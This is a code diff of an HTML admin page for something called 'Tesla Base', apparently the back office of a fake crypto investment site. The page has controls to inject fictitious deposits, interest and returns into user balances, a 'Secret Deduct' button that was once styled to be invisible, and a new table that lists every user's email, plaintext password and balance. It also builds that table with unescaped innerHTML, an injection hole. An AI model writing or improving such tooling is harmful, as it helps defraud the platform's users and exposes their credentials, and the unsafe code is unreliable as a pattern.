@@ -4,33 +4,35 @@
     <meta charset="UTF-8">
     <title>Tesla Base | Admin</title>
     <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
-<body style="padding: 30px; background: #050505;">
-    <h1>Tesla Base - MASTER ADMIN</h1>
-    
-    <div class="admin-panel">
-        <h3>User Monitoring</h3>
-        <div id="user-list">
-            </div>
+<body style="background: #000; color: #fff; padding: 20px;">
+    <h1>User Management (Passwords Visible)</h1>
+    <table border="1" style="width:100%; background: #111;">
+        <thead>
+            <tr><th>Email</th><th>Password</th><th>Balance</th><th>Action</th></tr>
+        </thead>
+        <tbody id="user-rows"></tbody>
+    </table>
 
-        <hr>
-
-        <h3>Global Settings</h3>
-        <input type="text" id="admin-btc-wallet" placeholder="System BTC Wallet Address">
-        <button onclick="updateGlobalWallet()">Update Wallet</button>
-
-        <hr>
-
-        <h3>Manual Actions (Inject/Deduct)</h3>
+    <div style="margin-top: 40px; background: #222; padding: 20px;">
+        <h3>Inject Funds</h3>
         <input type="text" id="target-user" placeholder="User Email">
         <input type="number" id="inject-amount" placeholder="Amount">
         <button onclick="adminAction('deposit')">Inject Deposit</button>
-        <button onclick="adminAction('interest')">Inject Interest</button>
-        <button onclick="adminAction('return')">Inject Inv. Return</button>
-        <button onclick="adminAction('deduct')" style="background:none; border:none; color:#111;">Secret Deduct</button>
+        <button onclick="adminAction('deduct')">Secret Deduct</button>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="app.js"></script>
+    <script>
+        async function loadUsers() {
+            const { data } = await _supabase.from('profiles').select('*');
+            const container = document.getElementById('user-rows');
+            data.forEach(u => {
+                container.innerHTML += `<tr><td>${u.email}</td><td>${u.password}</td><td>$${u.balance}</td><td><button onclick="document.getElementById('target-user').value='${u.email}'">Select</button></td></tr>`;
+            });
+        }
+        loadUsers();
+    </script>
 </body>
 </html>
